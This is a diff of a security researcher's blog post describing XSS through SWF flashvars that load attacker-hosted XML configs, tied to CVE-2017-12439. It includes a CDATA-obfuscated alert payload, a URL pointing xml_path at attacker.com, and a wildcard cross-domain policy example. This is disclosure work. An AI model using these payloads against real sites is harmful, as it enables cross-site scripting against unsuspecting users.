@@ -80,7 +80,7 @@ button 48 {
 <p>The above illustrates a vulnerability pertinent to the clickTag flashvar. An analysis on the above can be observed <a href="posts/ASD-XSSposed.html">here</a>.<p>
 <p>Vulnerabilities that could exist within Shockwave Flash files include; SOME attacks, Content Forgery, Unvalidated Redirects, as well as, XSS.</p>
 
-<p>In terms of exploiting such vulnerabilities through a cross-domain approach, some vendors incorporate an XML config file to control the behaviour of the SWF. Therefore, these SWF files may have a dynamic flashvar pointing to a config file on the same server the SWF is hosted on. However, if this flashvar can be controlled by the attacker externally, with a correct cross-domain policy configured on the attacking server, all that is required is to remotely call a malicious XML variation (hosted on an attacker’s server), which in turn, will include the instructions to control the SWF, thus determining its behaviour. The attack vectors associated with this method of exploitation remains similar as to that of the above, however, the methods slightly vary. For example, an XSS payload is incorporated within an XML entity either as a variable’s value, or arbitrarily through the malicious XML via the use of CDATA:
+<p>In terms of exploiting such vulnerabilities through a cross-domain approach, some vendors incorporate an XML configuration to control the behaviour of the SWF. Therefore, these SWF files may have a dynamic flashvar pointing to a config file on the same server the SWF is hosted on. However, if this flashvar can be controlled by the attacker externally, with a correct cross-domain policy configured on the attacking server, all that is required is to remotely call a malicious XML variation (hosted on an attacker’s server), which in turn, will include the instructions to control the SWF, thus determining its behaviour. The attack vectors associated with this method of exploitation remains similar as to that of the above, however, the methods slightly vary. For example, an XSS payload is incorporated within an XML entity either as a variable’s value, or arbitrarily through the malicious XML via the use of CDATA:
 </p>
 
 <p>#[EXPLOITING VULNERABLE XML CONFIGURATIONS THROUGH CDATA] :</p>
@@ -88,11 +88,21 @@ button 48 {
 &lt;![CDATA[<]]>script&lt;![CDATA[>]]>alert('xss')&lt;![CDATA[<]]>/script&lt;![CDATA[>]]>
 </pre>
 
-This would then be called in the manner of:
+This would then be called in the manner of:<br>
 	http://example.com/swf/example.swf?xml_path=//attacker.com/poc.xml
 
-I identified this issue within many SWF generators and slideshow makers, including that of a Windows application titled <a href="https://www.flash-slideshow-maker.com/">Flash Slideshow Maker Professional</a>, with version 5.20 and below being vulnerable in the way they handle 'advanced' file behaviour. See <a href="cve-2017-12439.html">CVE-2017-12439</a> for more information.
-<p> ~ ret2eax</p>
+<p>It should be noted that as a precondition, a permissive cross-domain policy needs to be configured:</p>
+<pre class="hack dark"
+<?xml version="1.0"?>
+<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
+<cross-domain-policy>
+<site-control permitted-cross-domain-policies="all"/>
+<allow-access-from domain="*" secure="false"/>
+<allow-http-request-headers-from domain="*" headers="*" secure="false"/>
+</cross-domain-policy>
+</pre>
+<p>I identified this issue within many SWF generators and slideshow makers, including that of a Windows application titled <a href="https://www.flash-slideshow-maker.com/">Flash Slideshow Maker Professional</a>, with version 5.20 and below being vulnerable in the way they handle 'advanced' file behaviour. See <a href="cve-2017-12439.html">CVE-2017-12439</a> for more information.
+</p><p> ~ ret2eax</p>
 </div>
 <center>
 <footer><< <a href="http://twitter.com/ret2eax" target="_blank"">twitter</a> || <a href="https://www.openbugbounty.org/researchers/ret2eax/" target="_blank">openbugbounty</a> || <a href="https://www.hackerone.com/ret2eax" target="_blank">h1</a> || <a href="mailto:ret2eax@riseup.net">ret2eax@riseup.net</a> >></footer></center>
